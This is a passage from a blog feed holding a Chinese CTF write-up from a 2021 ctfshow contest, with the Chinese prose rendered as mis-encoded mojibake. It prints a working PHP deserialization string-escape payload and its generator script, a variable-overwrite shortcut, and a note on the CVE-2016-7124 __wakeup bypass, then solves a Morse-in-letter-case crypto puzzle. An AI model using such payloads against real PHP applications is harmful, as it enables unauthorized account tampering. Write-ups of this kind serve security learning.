ååºåˆ—åŒ–</p><p><code>str_replace</code>å°†<code>ctfshowup</code>æ›¿æ¢ä¸º<code>ctfshow</code>ï¼Œä¹Ÿå°±æ˜¯è¯´åŸæ¥9ä¸ªå­—ç¬¦å˜æˆäº†7ä¸ªå­—ç¬¦ï¼Œæœ‰ä¸¤ä¸ªå­—ç¬¦é€ƒé€¸äº†ã€‚</p><p>æˆ‘ä»¬çš„æ ¸å¿ƒç›®æ ‡æ˜¯å°†<code>password</code>è¦†ç›–ä¸º<code>ctfshowvip</code>ï¼Œæ‰€ä»¥æœ€åéƒ¨åˆ†çš„åºåˆ—åŒ–å­—ç¬¦ä¸²åº”ä¸º<code>;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</code>ï¼Œä¸€å…±35ä¸ªå­—ç¬¦ã€‚</p><p>æ‰€ä»¥å®ƒåŸå§‹ç”Ÿæˆçš„éƒ¨åˆ†åº”è¯¥è¢«è¦†ç›–çš„ä¸º<code>&quot;;s:8:&quot;password&quot;;s:35:</code>å³22ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥<code>username</code>åº”è¯¥å¡«å…¥11ä¸ª<code>ctfshowup</code>æ¥è¦†ç›–å®ƒ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">spaceman</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'ctfshowup'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ctfshow'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$user_name</span><span class="token operator">=</span><span class="token double-quoted-string string">"ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup"</span><span class="token punctuation">;</span><span class="token variable">$pass_word</span><span class="token operator">=</span><span class="token double-quoted-string string">";s:8:\"password\";s:10:\"ctfshowvip\";&#125;"</span><span class="token punctuation">;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">spaceman</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">,</span><span class="token variable">$pass_word</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$test = unserialize($ser);</span><span class="token keyword">echo</span> <span class="token variable">$ser</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>æœ€ç»ˆpayload</p><p><code>user name=ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup&amp;&amp;pass word=;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</code></p><p>è®°å¾—ç©ºæ ¼ç»•<code>_</code></p><img src="/article/djbctf2021/image-20210128173924844.png" class="" title="image-20210128173924844" loading="lazy"><h4 id="éé¢„æœŸè§£"><a href="#éé¢„æœŸè§£" class="headerlink" title="éé¢„æœŸè§£"></a>éé¢„æœŸè§£</h4><p>ç”±äºå˜é‡è¦†ç›–ï¼Œç›´æ¥è¦†ç›–<code>pass_word</code>å³å¯</p><p>payloadï¼š<code>pass word=ctfshowvip</code></p><img src="/article/djbctf2021/image-20210128174153341.png" class="" title="image-20210128174153341" loading="lazy"><h4 id="é¢˜ç›®æ€è€ƒ-1"><a href="#é¢˜ç›®æ€è€ƒ-1" class="headerlink" title="é¢˜ç›®æ€è€ƒ"></a>é¢˜ç›®æ€è€ƒ</h4><p><strong>å½“æˆå‘˜å±æ€§æ•°ç›®å¤§äºå®é™…æ•°ç›®æ—¶å¯ç»•è¿‡wakeupæ–¹æ³•(CVE-2016-7124)</strong> </p><p>æ¼æ´å½±å“ç‰ˆæœ¬ï¼š</p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><p>ç»å…¸çš„ååºåˆ—åŒ–é•¿åº¦é€ƒé€¸çš„é¢˜ç›®äº†</p><hr><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="å¤§ä½¬ä»¬å¸®æˆ‘çœ‹çœ‹æˆ‘è¿™ä¸ªPythonè„šæœ¬ä¸ºä»€ä¹ˆè¿è¡Œä¸äº†å•Š"><a href="#å¤§ä½¬ä»¬å¸®æˆ‘çœ‹çœ‹æˆ‘è¿™ä¸ªPythonè„šæœ¬ä¸ºä»€ä¹ˆè¿è¡Œä¸äº†å•Š" class="headerlink" title="å¤§ä½¬ä»¬å¸®æˆ‘çœ‹çœ‹æˆ‘è¿™ä¸ªPythonè„šæœ¬ä¸ºä»€ä¹ˆè¿è¡Œä¸äº†å•Š"></a>å¤§ä½¬ä»¬å¸®æˆ‘çœ‹çœ‹æˆ‘è¿™ä¸ªPythonè„šæœ¬ä¸ºä»€ä¹ˆè¿è¡Œä¸äº†å•Š</h3><p>é¢˜ç›®æè¿°</p><pre class="language-none"><code class="language-none">èœé¸¡ 9:36:27èœé¸¡ä¸Šä¼ äº†æ–‡ä»¶ æ–°å»ºæ–‡æœ¬æ–‡æ¡£.pyèœé¸¡ 9:37:02key1: Do you want a DaJiBei?èœé¸¡ 9:37:61å¤§ä½¬ä»¬å¸®æˆ‘çœ‹çœ‹æˆ‘è¿™ä¸ªPythonè„šæœ¬ä¸ºä»€ä¹ˆè¿è¡Œä¸äº†å•Š</code></pre><p>hint1:</p><pre class="language-none"><code class="language-none">æœ€ç»ˆç»“æœæ˜¯è‡ªå¸¦flagæ ¼å¼çš„ï¼Œå¯ä»¥æ®æ­¤åˆ¤æ–­ç»“æœæ˜¯å¦æ­£ç¡®ï¼Œä¸å¿…æµªè´¹æ—¶é—´å°è¯•æäº¤æ ¼å¼</code></pre><p>hint2:</p><pre class="language-none"><code class="language-none">ä¸ºä»€ä¹ˆè¿è¡Œç»“æœé‡Œå¥½å¥½çš„3ï¼Œä¹Ÿè¦å†™æˆå¤§å°å†™æ··ä¹±çš„æ ·å­ï¼Ÿ</code></pre><p>hint3:</p><pre class="language-none"><code class="language-none">å¦‚æœæŸä¸ªæ–¹å‘å·²ç»æ‰¾ä¸åˆ°æ›´å¤šçš„çº¿ç´¢ï¼Œä¸å¦¨å›å¤´çœ‹çœ‹æ¥æ—¶çš„é“è·¯</code></pre><p>hint4:</p><pre class="language-none"><code class="language-none">æœ¬é¢˜çš„åŠ å¯†æ–¹å¼æ¥æºäºå¯¹ä»¥ä¸‹é—®é¢˜çš„æ€è€ƒï¼šå¦‚ä½•åœ¨åŒä¸€ä¸ªè½½ä½“ä¸ŠåŠ å¯†ä¸¤æ®µä¿¡æ¯ï¼Œä¸”è¯»å–å…¶ä¸­ä¸€ç§ä¿¡æ¯çš„è¿‡ç¨‹ä¼šä»¤å¦ä¸€ç§ä¿¡æ¯è¢«ç ´åï¼›å¹¶ä¸”ï¼Œå¦‚æœå‰ä¸€ç§ä¿¡æ¯çš„è¯»å–æ–¹å¼è¶³å¤Ÿæ˜¾è€Œæ˜“è§ï¼Œæ˜¯å¦å¯ä»¥åœ¨æœ‰é™çš„çŸ­æ—¶é—´å†…å°½å¯èƒ½è½¬ç§»æ³¨æ„åŠ›ï¼Œå‡å°‘éé¢„æœŸæ¥æ”¶è€…å‘ç°å¦ä¸€æ®µä¿¡æ¯çš„å¯èƒ½æ€§ï¼Ÿ ä¸ºäº†é™ä½éš¾åº¦ï¼Œæœ¬é¢˜åœ¨é€‰æ‹©æ¯ä¸€ç§ä¿¡æ¯çš„åŠ å¯†æ–¹å¼æ—¶ï¼Œå°½å¯èƒ½é€‰æ‹©äº†å¤æ‚åº¦è¾ƒä½çš„åšæ³•ï¼›åŒæ—¶ï¼Œå°†å…¶ä¸­ä¸€æ®µä¿¡æ¯ï¼ˆç›¸ä¿¡å¤§å®¶éƒ½å·²ç»æ‰¾åˆ°è¿™ä¸€æ®µäº†ï¼‰è®¾è®¡ä¸ºå¦ä¸€æ®µä¿¡æ¯åŠ å¯†æ–¹å¼çš„æç¤ºã€‚</code></pre><p>hint5:</p><img src="/article/djbctf2021/hint.png" class="" title="hint.png" loading="lazy"><p>æœ€ç»ˆæç¤ºhint5ç›´æ¥ç‚¹æ˜æ‘©æ–¯å¯†ç </p><p>é¢˜ç›®åŸä»¶</p><pre class="language-python" data-language="python"><code class="language-python">fROM CRYPTO<span class="token punctuation">.</span>utIL<span class="token punctuation">.</span>NuMBER IMPORT BYteS_TO_LoNG<span class="token punctuation">,</span> long_TO_BYTESA_Fake_FLaG <span class="token operator">=</span> <span class="token string">B'FLag&#123;I_AM_the_TRUE_Flag_trUST_me&#125;'</span>nuMBER <span class="token operator">=</span> bYTEs_tO_long<span class="token punctuation">(</span>a_FAKE_FLAG<span class="token punctuation">)</span>KeY1 <span class="token operator">=</span> <span class="token string">B'DO yOU WAnT A DAJIBEI?'</span>KEY1 <span class="token operator">=</span> Bytes_to_lONG<span class="token punctuation">(</span>KEY1<span class="token punctuation">)</span>KEY2 <span class="token operator">=</span> <span class="token number">0XBCD2deE7E7114B5C856F8DAECeD0782BD891200B4D8264D854A13D53cF1F0c481b</span>iv <span class="token operator">=</span> <span class="token number">10800</span>KEY3 <span class="token operator">=</span> KeY2 <span class="token operator">*</span> IVIS_THIS_rEAL_FlAG <span class="token operator">=</span> <span class="token punctuation">(</span>NUmber <span class="token operator">+</span> kEY3<span class="token punctuation">)</span> <span class="token operator">//</span> KEy1<span class="token keyword">print</span><span class="token punctuation">(</span>long_tO_bytes<span class="token punctuation">(</span>IS_THis_REAl_flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>ã€Šå…³äºæˆ‘çš„è€å¸ˆçœ‹åˆ°ç›´æ¥æ°”æ­»è¿‡å»æ€ä¹ˆåŠã€‹</p><p>æ ¹æ®é¢˜ç›®æè¿°ï¼ŒæŠŠ<code>key1</code>æ›¿æ¢ä¸º<code>Do you want a DaJiBei?</code></p><p>è°ƒæ•´å¥½æ ¼å¼è·‘ä¸€éï¼Œå¾—åˆ°<code>thrEE_means_3</code>ï¼Œå°è¯•å„ç§å•è¡¨åŠ å¯†å‡æ— æœï¼Œæ ¹æ®hint4ï¼Œå¯¹åŸå§‹æ–‡ä»¶è¿›è¡Œå°è¯•è¿˜æ˜¯æ— æœï¼Œæœ€åæ¯”èµ›å¿«ç»“æŸäº†ï¼Œæ”¾å‡ºç›´æ¥æç¤ºhint5ï¼Œå°è¯•å°†å…¨ç¯‡å°å†™è½¬æ¢ä¸º<code>.</code>ï¼Œå¤§å†™è½¬æ¢ä¸º<code>-</code>è§£å¯†ï¼Œå‘ç°æ‘©æ–¯å¯†ç è¡¨å¹¶ä¸æ˜¯å›ºå®šä½æ•°ï¼Œæ€•æ˜¯è¦çˆ†ç ´æ’åˆ—ç»„åˆï¼Œæ”¾å¼ƒäº†ã€‚</p><p>èµ›åå‡ºé¢˜äºº @cheyenne æŒ‡ç‚¹ï¼Œæœ¬é¢˜æ‘©æ–¯å¯†ç ç»Ÿä¸€é‡‡ç”¨äº”ä½ä¸€ç»„ï¼Œç”±æ€»æ•°ä¸º245ä½å¯å¾—ã€‚</p><p>ç”±äºæœ¬äººpythonæ­£åœ¨è‡ªå­¦æ°´å¹³ä¸€èˆ¬ï¼Œå¥—ç”¨ä¹‹å‰å†™è¿‡çš„ä¸€å¥—Cçš„æ›¿æ¢ç¨‹åº</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/*@Time ï¼š 2021/1/24 13:58@Auth ï¼š gyy@Blog ï¼šhttp://err0r.top*/</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> n<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>FILE <span class="token operator">*</span>fpw<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> c<span class="token punctuation">,</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token operator">=</span>str<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">>=</span><span class="token string">'A'</span><span class="token operator">&amp;&amp;</span>c<span class="token operator">&lt;=</span><span class="token string">'Z'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>n<span class="token operator">++</span><span class="token punctuation">;</span><span class="token function">fputc</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">>=</span><span class="token string">'a'</span><span class="token operator">&amp;&amp;</span>c<span class="token operator">&lt;=</span><span class="token string">'z'</span><span class="token punctuation">)</span>       <span class="token punctuation">&#123;</span>       n<span class="token operator">++</span><span class="token punctuation">;</span>       <span class="token function">fputc</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       <span class="token keyword">else</span>       <span class="token keyword">continue</span><span class="token punctuation">;</span>       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">%</span><span class="token number">5</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token function">fputc</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>FILE <span class="token operator">*</span>fpr<span class="token punctuation">,</span><span class="token operator">*</span>fpw<span class="token punctuation">;</span><span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fpr<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"py"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can't open!'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fpw<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can't write!'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">,</span>fpr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token function">write</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è°ƒç”¨å‡½æ•°</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fpr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fpw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æµ“æµ“çš„èœé¸¡å‘³~ï¼Œè·‘å‡ºç»“æœ</p><pre class="language-none"><code class="language-none">.---- ----- ..--- .---- ----- ---.. ----. --... .---- ----- ...-- .---- ..--- ...-- ---.. ...-- -.... ----. ---.. -.... .---- ----- .---- .---- .---- ----- ----. ..... .---- ----- ----. .---- ----- .---- ----. --... .---- .---- ----- .---- .---- ..... ----. ..... ..... -.... .---- ..--- .....</code></pre><p>æ‹¿å»è§£å¯†å¾—</p><pre class="language-none"><code class="language-none">1021089710312383698610111095109101971101159556125</code></pre><p>çœ‹åˆ°asciiç <code> 102 108 97 103</code>ç«‹é©¬èµ·äº†ååº”ï¼Œè¿™æ˜¯<code>flag</code>çš„asciiç ï¼Œæ‰€ä»¥æ˜¯æ¯ä¸¤ä¸ªæˆ–ä¸‰ä¸ªç»„åˆæˆä¸€ä¸ªå­—ç¬¦</p><pre class="language-none"><code class="language-none">102 108 97 103 123 83 69 86 101 110 95 109 101 97 110 115 95 56 125</code></pre><p>æœ€åå¾—åˆ°flagï¼š<code>flag&#123;SEVen_means_8&#125;</code></p><p>æ— é™æ¥è¿‘ç­”æ¡ˆï¼Œä½†å¯†ç å­¦çˆ·çˆ·å¤ªå¼ºäº†å‘œå‘œå‘œ</p><hr><p>æœ‰äº›æ”¶è·å§ï¼Œå¦‚æœ‰é—®é¢˜å¸Œæœ›å¤§ä½¬ä»¬æ–§æ­£ã€‚2021ä¸€èµ·å­¦ä¹ ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2021ç¬¬ä¸€åœºæ¯”èµ›&lt;/p&gt;
&lt;p&gt;æ˜µç§°ï¼šåˆ«ç­”äº†åˆ«ç­”äº†å†ç­”äººå‚»äº†&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="PHP" scheme="https://err0r.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>2021</title>
    <link href="https://err0r.top/article/2021/"/>
    <id>https://err0r.top/article/2021/</id>
    <published>2020-12-31T16:00:00.000Z</published>
    <updated>2021-03-19T05:34:57.780Z</updated>
    
    <content type="html"><![CDATA[<p align="center">å±•æœ›2021</p><a id="more"></a>]]></content>
    
    
    <summary type="html">&lt;p align=&quot;center&quot;&gt;å±•æœ›2021&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
